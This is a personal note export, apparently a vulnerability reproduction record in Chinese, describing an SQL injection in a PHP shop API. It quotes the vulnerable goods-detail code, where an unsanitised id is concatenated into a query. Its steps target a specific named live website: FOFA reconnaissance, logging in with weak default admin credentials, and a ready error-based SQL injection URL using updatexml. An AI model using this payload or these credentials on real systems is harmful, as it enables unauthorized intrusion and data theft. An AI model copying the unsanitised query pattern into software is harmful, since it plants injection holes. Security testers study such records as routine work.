{"ID":"20241030231112-rzp4exv","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241030231112-rzp4exv","scroll":"\u0026#123;\u0026quot;rootId\u0026quot;:\u0026quot;20241030231112-rzp4exv\u0026quot;,\u0026quot;startId\u0026quot;:\u0026quot;20241030231114-6h0m7tb\u0026quot;,\u0026quot;endId\u0026quot;:\u0026quot;20241030231114-vs7ctyo\u0026quot;,\u0026quot;scrollTop\u0026quot;:0\u0026#125;","title":"https:tg.pgy.nxidea.cnindex.php?s=apigoods_detail\u0026amp;amp;goods_id=1","updated":"20241030231125"},"Children":[{"ID":"20241030231114-6h0m7tb","Type":"NodeParagraph","Properties":{"id":"20241030231114-6h0m7tb","updated":"20241030231118"}},{"ID":"20241030231114-w2nkxlo","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241030231114-w2nkxlo","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"影响参数"}]},{"ID":"20241030231114-1k5hmem","Type":"NodeParagraph","Properties":{"id":"20241030231114-1k5hmem","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"id"}]},{"ID":"20241030231114-byrdp1e","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241030231114-byrdp1e","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"漏洞POC"}]},{"ID":"20241030231114-qdr4kem","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241030231114-qdr4kem","updated":"20241030231114"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker"},{"Type":"NodeCodeBlockCode","Data":" public function get_goods_detail() {\n        $id = I(\u0026#039;get.id\u0026#039;);\n        $pin_id = I(\u0026#039;get.pin_id\u0026#039;, 0);\n\n\t\t$token = I(\u0026#039;get.token\u0026#039;);\n\n\t\t$weprogram_token = M(\u0026#039;weprogram_token\u0026#039;)-\u003efield(\u0026#039;member_id\u0026#039;)-\u003ewhere( array(\u0026#039;token\u0026#039; =\u003e$token) )-\u003efind();\n\t\t$member_id = $weprogram_token[\u0026#039;member_id\u0026#039;];\n\n\n\t\t \n\n        $need_data = array();\n        $sql = \"select g.*,gd.description,gd.is_untake_level,level_discount,gd.video_src,gd.video_size_width,gd.vedio_size_height,gd.is_video,\n            gd.summary,gd.share_title,gd.activity_summary,gd.tag from \" . C(\u0026#039;DB_PREFIX\u0026#039;) . \"goods g,\" . C(\u0026#039;DB_PREFIX\u0026#039;) . \"goods_description gd where g.goods_id=gd.goods_id and g.goods_id=\" . $id;\n        $goods = M()-\u003equery($sql);\n        $pin_model = D(\u0026#039;Home/Pin\u0026#039;);\n        $goods_model = D(\u0026#039;Home/Goods\u0026#039;);\n        $qian = array(\n            \"/Uploads/image\"\n        );\n\t\t$c_site_url = str_replace(\u0026#039;/dan\u0026#039;,\u0026#039;\u0026#039;,C(\u0026#039;SITE_URL\u0026#039;));\n        $hou = array(\n            $c_site_url . \"/Uploads/image\"\n        );\n\t\t$goods[0][\u0026#039;video_src\u0026#039;] = C(\u0026#039;SITE_URL\u0026#039;).\"Uploads/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/\".$goods[0][\u0026#039;video_src\u0026#039;];\n\n        $goods[0][\u0026#039;description\u0026#039;] = str_replace($qian, $hou, $goods[0][\u0026#039;description\u0026#039;]);\n        $goods[0][\u0026#039;description\u0026#039;] = htmlspecialchars_decode($goods[0][\u0026#039;description\u0026#039;]);\n        $qian = array(\n            \"\\r\\n\"\n        );\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241030231114-phtnfce","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241030231114-phtnfce","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"复现步骤"}]},{"ID":"20241030231114-r6a2de3","Type":"NodeParagraph","Properties":{"id":"20241030231114-r6a2de3","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"fofa信息收集发现"}]},{"ID":"20241030231114-92bg8hv","Type":"NodeParagraph","Properties":{"id":"20241030231114-92bg8hv","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"20241028-172b7046a0920b21c13e419d2dac65f2.png!small"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"https://i.3001.net/uploads/Up_imgs/20241028-172b7046a0920b21c13e419d2dac65f2.png!small"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241030231114-pll9poq","Type":"NodeParagraph","Properties":{"id":"20241030231114-pll9poq","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"访问后密码爆破弱口令爆破"}]},{"ID":"20241030231114-fgfbdtp","Type":"NodeParagraph","Properties":{"id":"20241030231114-fgfbdtp","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"admin admin888"}]},{"ID":"20241030231114-01d5sir","Type":"NodeParagraph","Properties":{"id":"20241030231114-01d5sir","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"SQL注入漏洞"}]},{"ID":"20241030231114-xucmgfh","Type":"NodeParagraph","Properties":{"id":"20241030231114-xucmgfh","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"https://tg.pgy.nxidea.cn/index.php?s=api/goods_detail\u0026amp;goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)"},{"Type":"NodeText","Data":"​"}]},{"ID":"20241030231114-vs7ctyo","Type":"NodeParagraph","Properties":{"id":"20241030231114-vs7ctyo","updated":"20241030231114"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"20241028-f8877f913d79dcdef64a8d1dd2aee087.png!small"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"https://i.3001.net/uploads/Up_imgs/20241028-f8877f913d79dcdef64a8d1dd2aee087.png!small"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}